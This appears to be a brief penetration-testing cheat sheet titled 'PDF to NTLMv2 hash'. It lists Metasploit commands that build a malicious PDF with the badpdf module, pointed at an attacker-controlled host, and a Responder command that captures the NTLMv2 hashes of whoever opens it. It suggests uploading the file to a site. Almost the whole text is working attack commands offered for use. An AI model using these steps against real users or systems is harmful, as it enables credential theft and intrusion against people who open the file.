# PDF to NTLMv2 hash

Especially useful when able to upload pdf files to site

### Generate Malicious PDF file

```bash
msfconsole
use auxiliary/fileformat/badpdf
set filename helloworld.pdf
set lhost 10.10.14.2
run
```

### Listen for NTLMv2 Hash

```bash
responder -I tun0
```
